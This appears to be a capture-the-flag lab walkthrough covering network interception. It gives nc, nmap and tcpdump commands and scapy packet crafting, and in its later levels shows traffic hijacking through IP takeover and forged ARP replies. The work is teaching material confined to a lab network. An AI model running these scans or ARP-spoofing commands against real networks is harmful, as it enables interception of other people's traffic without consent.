---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 7
---

## level 1

> Connect to a remote host

We can use `nc` to connect to the specified address on the port specified.

```
hacker@intercepting-communication~level1:/$ nc 10.0.0.3 31337
```

&nbsp;

## level 2

> Listen for a connection from a remote host

The `l` option in `nc` allows users to listen on a specified port.

```
hacker@intercepting-communication~level2:/$ nc -l 31337
```

&nbsp;

## level 3

> Find and connect to a remote host

`nmap` is a very useful tool that we can use to find open addressees and ports.

```
hacker@intercepting-communication~level3:/$ nmap -v 10.0.0.0/24 -p 31337
```

After that we just have to connect on the open

```
hacker@intercepting-communication~level3:/$ nc 10.0.0.245 31337
```

&nbsp;

## level 4

> Find and connect to a remote host on a large network

This time we have to scan a `/16` so we need to speed up the process.

The `T5` flag in `nmap` sets the scan speed to `insane` which is the fastest available speed.

```
hacker@intercepting-communication~level4:/$ nmap -v 10.0.0.0/16 -p 31337 -T5
```

&nbsp;

## level 5

> Monitor traffic from a remote host

We can use `tcpdump` to look at the packets we are receiving.

```
hacker@intercepting-communication~level5:/$ tcpdump -A
```

The `A` flag prints out every packet in ASCII.

&nbsp;

## level 6

```
hacker@intercepting-communication~level6:/$ tcpdump -A > packet.txt
```

```
hacker@intercepting-communication~level6:/$ cat packet.txt
```

&nbsp;

## level 7

> Hijack traffic from a remote host by configuring your network interface

In this level, the host at 10.0.0.4 is communicating with the host at 10.0.02.

We can essentially become 10.0.0.2 so that we now receive those packets.

```
hacker@intercepting-communication~level7:/$ ip address add 10.0.0.2/16 dev eth0
```

We have added the address on our `eth0` interface.

Now when we receive an ARP `who-has` request asking for 10.0.0.2, we can send a `is-at` reply with our MAC address.

```
hacker@intercepting-communication~level7:/$ nc -l 31337
```

&nbsp;

## level 8

> In this challenge you will manually send an Ethernet packet.\
> The packet should have `Ether type=0xFFFF`.\
> The packet should be sent to the remote host at `10.0.0.3`.

We can use `scapy` in order to create and send packets.

```
hacker@intercepting-communication~level8:/$ scapy
```

```python
>>> Ether().display()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 00:00:00:00:00:00
  type      = 0x9000
```

We have to change the default fields.

```python
>>> Ether(src="66:73:a8:6d:31:49", dst="ff:ff:ff:ff:ff:ff", type=0xFFFF).display()
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 66:73:a8:6d:31:49
  type      = 0xffff
```

Now that we have the correct fields, we are ready to send the packet on the `eth0` interface.

```python
>>> sendp(Ether(src="66:73:a8:6d:31:49", dst="ff:ff:ff:ff:ff:ff", type=0xFFFF), iface="eth0")
```

The remote host is connected to the `eth0` interface, so we send the packets out of the `eth0` interface.

&nbsp;

## level 9

> In this challenge you will manually send an Internet Protocol packet.\
> The packet should have `IP proto=0xFF`.\
> The packet should be sent to the remote host at `10.0.0.3`.

We can encapsulate a packet within another packet using the `/` separator.

```python
>>> (Ether(src="c6:0a:09:24:4f:c9", dst="ff:ff:ff:ff:ff:ff") / IP()).display()
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = c6:0a:09:24:4f:c9
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = hopopt
     chksum    = None
     src       = 127.0.0.1
     dst       = 127.0.0.1
     \options   \
```

Now we just have to fill the correct fields.

```python
>>> sendp(Ether(src="c6:0a:09:24:4f:c9", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.2", dst="10.0.0.3", proto=0xFF), iface="eth0")
```

&nbsp;

## level 10

> Manually send a Transmission Control Protocol packet

We have to add another layer of encapsulation, which is TCP.

```python
>>> sendp(Ether(src="fa:2c:4a:60:51:ee", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP( sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF"), iface="eth0")
```

&nbsp;

## level 11

> Manually perform a Transmission Control Protocol handshake

A TCP handshake is really just a sequence of packets that establishes a secure and reliable connection between two devices.

It includes three packets:

1. SYN
2. SYN-ACK
3. ACK

We have to first send a SYN packet, represented by the `S` flag.

```python
>>> response = srp(Ether(src="1a:57:9e:f1:dd:33", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP(sport=31337, dport=31337, seq=31337, flags="S"), iface="eth0")
```

Let's look at the response from the host at 10.0.0.3.

```python
>>> response[0][0]
QueryAnswer(
	query=<Ether  dst=ff:ff:ff:ff:ff:ff src=1a:57:9e:f1:dd:33 type=IPv4 |<IP  frag=0 proto=tcp src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>, 
	answer=<Ether  dst=1a:57:9e:f1:dd:33 src=1e:c3:ea:f1:34:3e type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=tcp chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=3093962236 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0x362a urgptr=0 |>>>
)
```

As we can see, the response has `seq` field set to `3093962236` and the `ack` field set to `31338` which is our `seq+1`.

So the host at 10.0.0.3 has acknowledged our SYN packet. Now we have to acknowledge theirs by setting our `ack` field to `3093962237` which is their `seq+1`.

```python
>>> sendp(Ether(src="1a:57:9e:f1:dd:33", dst="1e:c3:ea:f1:34:3e") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP(sport=31337, dport=31337, seq=31338, ack=3093962237, flags="A"), iface="eth0")
```

&nbsp;

## level 12

> Manually send an Address Resolution Protocol packet

We need to tell the host at 10.0.0.3 that we have the IP address that they want to talk to. For that we need to send an ARP `is-at` response.

Note that ARP encapsulates an Ethernet frame.

```python
>>> ARP().display()
WARNING: No route found (no default route?)
WARNING: No route found (no default route?)
###[ ARP ]### 
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = 00:00:00:00:00:00
  psrc      = 0.0.0.0
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
```

The packet fields represent the following:

* `hwsrc`: Source hardware address. This will be updated in the target's ARP table.
* `psrc`: The IP to be added in the target's ARP table.
* `hwdst`: Destination hardware address.
* `pdst`: Destination where the ARP packet must go.

```python
>>> sendp(Ether(src="8a:3f:c0:ef:89:cf", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="8a:3f:c0:ef:89:cf"), iface="eth0")
```

&nbsp;

## level 13

> Hijack traffic from a remote host using ARP

In this level we have to achieve the same goal as level 7. However, we don't have the ability to add addresses as we are not the net admin.

Therefore we will have to create an ARP packet from scratch and send it to the host on 10.0.0.4.

```python
>>> sendp(Ether(src="76:45:f9:f1:45:de", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="10.0.0.2", hwsrc="76:45:f9:f1:45:de") / IP(src="10.0.0.3", dst="10.0.0.4"), iface="eth0")
```
